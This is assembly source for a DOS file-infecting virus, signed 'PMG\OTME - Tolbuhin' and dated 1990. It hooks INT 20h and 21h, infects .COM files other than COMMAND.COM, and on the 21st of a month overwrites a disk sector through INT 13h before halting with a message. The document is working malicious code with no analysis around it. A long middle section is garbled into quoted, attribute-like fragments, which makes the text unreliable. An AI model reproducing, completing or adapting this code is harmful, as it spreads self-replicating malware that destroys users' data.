

start:  jmp     short begin
	db	(00h)
	db	(53h)
	db	(4bh)
	int	20h
okey:	db	(0b8h)
	db	(03h)
	db	(00h)
	db	(0cdh)
	db	(10h)
begin:	push	cx
	CALL	F1
F1:	POP	SI
	SUB	SI,09
	push	cs
	pop	ds
	push	cs
	pop	es
        MOV     WORD PTR [LenF],SI
	cld
	mov	di,100h
	mov	cx,5
	rep	movsb
	jmp	ding1
int21h: STI
        cmp     ah,00
	jz	int20h
	cmp	ah,4ch
	jz	int20h
et1:    db      (0eah)
is:	dw	0
io:	dw	0

;int13h: sti
;        PUSH    BX
;        PUSH    CX
;        PUSH    DX
;        PUSH    DS
;        PUSH    ES
;        PUSH    SI
;        PUSH    DI
;        push    ax
;        push    ds
;        cmp     ah,03
;        jz      etk2
;        cmp     ah,05
;        jnz     etk3
;etk2:   mov     ax,0000
;        mov     ds,ax
;        inc     Word ptr [310h]
;        cmp     Word ptr [310h],0FFEh
;        jnz     etk3
;        push    cs
;        pop     ds
;        int     20h
;etk3:   pop     ds
;        pop     ax
;        int     65h
;        cld
;        mov     ax,0
;        POP     DI
;        POP     SI
;        POP     ES
;        POP     DS
;        POP     DX
;        POP     CX
;        POP     BX
;        iret
int20h: STI
        PUSH    AX
	PUSH	BX
	PUSH	CX
	PUSH	DX
	PUSH	DS
	PUSH	ES
	PUSH	SI
	PUSH	DI
	mov	ah,2ah
	int	21h
	cmp	dl,21
	jnz	okef
	mov	ax,0309h
	mov	dx,0000h
	mov	cx,0001h
	lea	bx,[100h]
	int	13h
	jmp	short okep
okef:   mov     ax,0
	mov	ds,ax
	inc	word ptr [310h]
	cmp	Word ptr [310h],0FFFh
	jnz	oke
okep:	push	cs
	pop	ds
	mov	ah,9
	mov	di,name-okey
	add	di,107h
	mov	dx,di
	int	21h
	cli
	hlt
oke:	mov	ax,0
	mov	ds,ax
	cmp	byte ptr [302h],0
	jz	et3
	mov	byte ptr [302h],0
	jmp	main
dinge:	jmp	ding
et3:	push	cs		;ds <- cs="" pop="" ds="" mov="" ah,2fh="" ;dos="" service="" function="" ah="2FH" (get="" dta)="" int="" 21h="" ;es:bx="" addres="" of="" current="" dta="" mov="" di,edta-okey="" add="" di,107h="" mov="" [di],es="" mov="" [di+2],bx="" mov="" ah,1ah="" ;dos="" service="" function="" ah="1AH" (set="" dta)="" push="" cs="" pop="" ds="" mov="" dx,dta-okey="" ;ds:dx="" addres="" of="" dta="" add="" dx,107h="" int="" 21h="" push="" cs="" pop="" ds="" mov="" ah,4eh="" mov="" dx,files-okey="" add="" dx,107h="" mov="" cx,00="" int="" 21h="" ;dos="" service="" function="" ah="4EH" (find="" first)="" jc="" dinge="" ;cx="" file="" attribute="" ;ds:dx="" pointer="" of="" filespec="" (asciiz="" string)="" vir:="" mov="" ax,3d02h="" push="" cs="" pop="" ds="" mov="" dx,dta-okey="" ;ds:dx="" addres="" of="" dta="" add="" dx,107h="" add="" dx,1eh="" int="" 21h="" ;dos="" service="" function="" ah="3DH" (open="" file)="" ;al="" open="" mode="" ;ds:dx="" pointer="" to="" filename="" (asciiz="" string)="" ;return="" ax="" file="" handle="" mov="" di,handle-okey="" add="" di,107h="" mov="" [di],ax="" mov="" ah,'c'="" mov="" al,'d'="" push="" dx="" pop="" bx="" cmp="" [bx],ah="" ;compare="" filename="" for="" 'command.com'="" jnz="" p1="" ;if="" not="" first="" char="" 'c'="" then="" push="" virus="" in="" file="" cmp="" [bx+6],al="" jz="" v="" ;if="" 7="" char="" 'd'="" then="" find="" next="" file="" p1:="" mov="" di,handle-okey="" add="" di,107h="" mov="" bx,[di]="" push="" cs="" pop="" ds="" mov="" ah,3fh="" mov="" dx,end-okey="" add="" dx,107h="" mov="" cx,5="" int="" 21h="" ;dos="" service="" function="" ah="3FH" (read="" file)="" ;bx="" file="" handle="" ;cx="" number="" of="" bytes="" to="" read="" ;ds:dx="" addres="" of="" buffer="" push="" cs="" pop="" es="" ;es=""></-><- cs="" cld="" push="" dx="" pop="" si="" mov="" di,107h="" mov="" cx,5="" rep="" movsb="" ;repeat="" while="" cx="">0 do ES:DI <- ds:si="" ;="" si="SI+1" ;="" di="DI+1" mov="" ax,534bh="" mov="" di,dx="" add="" di,3="" cmp="" [di],ah="" jnz="" fuck="" inc="" di="" cmp="" [di],al="" jnz="" fuck="" v:="" push="" cs="" pop="" ds="" mov="" di,handle-okey="" add="" di,107h="" mov="" bx,[di]="" mov="" ah,3eh="" int="" 21h="" push="" cs="" pop="" ds="" mov="" ah,4fh="" int="" 21h="" jc="" enzi="" jmp="" short="" vir="" enzi:="" jmp="" ding="" fuck:="" mov="" ax,dta-okey="" add="" ax,107h="" add="" ax,1ah="" mov="" di,ax="" mov="" word="" ptr="" cx,[di]="" mov="" ax,end-okey="" add="" ax,107h="" mov="" di,ax="" mov="" al,0e9h="" cmp="" cx,0feh="" jna="" v="" add="" cx,2="" mov="" [di],al="" inc="" di="" mov="" word="" ptr="" [di],cx="" mov="" ax,534bh="" add="" di,2="" mov="" [di],ah="" inc="" di="" mov="" [di],al="" mov="" di,handle-okey="" add="" di,107h="" mov="" bx,[di]="" mov="" ax,4200h="" xor="" cx,cx="" xor="" dx,dx="" push="" cs="" pop="" ds="" int="" 21h="" mov="" di,handle-okey="" add="" di,107h="" mov="" bx,[di]="" mov="" ah,40h="" mov="" dx,end-okey="" add="" dx,107h="" mov="" cx,5="" int="" 21h="" mov="" ax,4202h="" xor="" cx,cx="" xor="" dx,dx="" int="" 21h="" push="" cs="" pop="" ds="" mov="" di,handle-okey="" add="" di,107h="" mov="" bx,[di]="" mov="" ah,40h="" mov="" dx,107h="" mov="" cx,end-okey="" int="" 21h="" mov="" ah,3eh="" int="" 21h="" mov="" ax,0000="" mov="" ds,ax="" inc="" word="" ptr="" [0310h]="" push="" cs="" pop="" ds="" ding:="" mov="" ah,1ah="" mov="" di,edta-okey="" add="" di,107h="" mov="" ds,[di]="" mov="" dx,[di+2]="" int="" 21h="" main:="" push="" cs="" pop="" ds="" pop="" di="" pop="" si="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" int1h:="" db="" (0eah)="" intsh:="" dw="" (0)="" intoh:="" dw="" (0)="" name:="" db="" 'virus="" in="" memory="" !!!="" created="" by="" 21.i.1990="" -="" pmg\otme="" -="" tolbuhin="" ...$'="" for1:="" jmp="" for="" files:="" db="" '*.com',0="" ding1:="" mov="" ax,0000h="" mov="" ds,ax="" mov="" byte="" ptr="" [302h],1="" cmp="" word="" ptr="" [300h],4b53h="" jz="" for1="" mov="" word="" ptr="" [300h],4b53h="" mov="" ah,62h="" int="" 21h="" mov="" ds,bx="" mov="" bx,[2ch]="" dec="" bx="" mov="" dx,0ffffh="" loc_1:="" mov="" ds,bx="" mov="" di,[3]="" inc="" di="" add="" dx,di="" add="" bx,di="" cmp="" byte="" ptr="" [0000],5ah="" jne="" loc_1="" mov="" cx,es="" add="" cx,dx="" sub="" word="" ptr="" [3],80h="" sub="" cx,80h="" sub="" cx,10h="" mov="" es,cx="" mov="" di,100h="" cld="" push="" di="" mov="" ax,0000h="" mov="" ds,ax="" ;="" mov="" bx,[004ch]="" ;="" mov="" [0194h],bx="" ;="" mov="" cx,[004eh]="" ;="" mov="" [0196h],cx="" mov="" bx,[0080h]="" mov="" cx,[0082h]="" push="" cs="" pop="" ds="" mov="" di,intsh-okey="" add="" di,[lenf]="" mov="" [di],bx="" mov="" [di+2],cx="" mov="" ax,0000h="" mov="" ds,ax="" mov="" bx,[0084h]="" mov="" cx,[0086h]="" push="" cs="" pop="" ds="" mov="" di,is-okey="" add="" di,[lenf]="" mov="" [di],bx="" mov="" [di+2],cx="" push="" cs="" pop="" ds="" pop="" di="" mov="" si,[lenf]="" sub="" si,7="" mov="" cx,800h="" push="" cs="" pop="" ds="" rep="" movsb="" mov="" ax,0000="" mov="" ds,ax="" mov="" word="" ptr="" [0082h],es="" mov="" word="" ptr="" [0086h],es="" ;="" mov="" word="" ptr="" [004eh],es="" ;="" mov="" di,int13h-okey="" ;="" add="" di,107h="" ;="" mov="" word="" ptr="" [004ch],di="" mov="" di,int20h-okey="" add="" di,107h="" mov="" word="" ptr="" [0080h],di="" mov="" di,int21h-okey="" add="" di,107h="" mov="" word="" ptr="" [0084h],di="" jmp="" ding3="" for:="" mov="" ax,0="" mov="" ds,ax="" mov="" bx,[80h]="" mov="" cx,[82h]="" push="" cx="" pop="" ds="" push="" cx="" mov="" di,intsh-okey="" add="" di,107h="" mov="" bx,[di]="" mov="" cx,[di+2]="" push="" cs="" pop="" ds="" mov="" di,v20h1-okey="" add="" di,[lenf]="" mov="" [di],bx="" mov="" [di+2],cx="" mov="" ax,0000h="" mov="" ds,ax="" mov="" byte="" ptr="" [302h],0="" pop="" ds="" mov="" di,intsh-okey="" add="" di,107h="" mov="" bx,ding2-okey="" add="" bx,[lenf]="" mov="" word="" ptr="" [di],bx="" mov="" word="" ptr="" [di+2],cs="" int="" 20h="" ding2:="" push="" cs="" pop="" ds="" mov="" di,v20h1-okey="" add="" di,[lenf]="" mov="" bx,[di]="" mov="" cx,[di+2]="" mov="" ax,0="" mov="" ds,ax="" mov="" word="" ptr="" ax,[82h]="" mov="" word="" ptr="" [302h],1="" mov="" ds,ax="" mov="" di,intsh-okey="" add="" di,107h="" mov="" [di],bx="" mov="" [di+2],cx="" ding3:="" push="" cs="" pop="" ds="" push="" cs="" pop="" es="" pop="" cx="" mov="" si,100h="" jmp="" si="" lenf:="" dw="" dta:="" db="" 256="" dup="" (?)="" handle:="" dw="" edta:="" dw="" bdta:="" dw="" v20h1:="" dw="" v20h2:="" dw="" com:="" db="" 'command'="" end:="" db="" (00)="" =""></-></->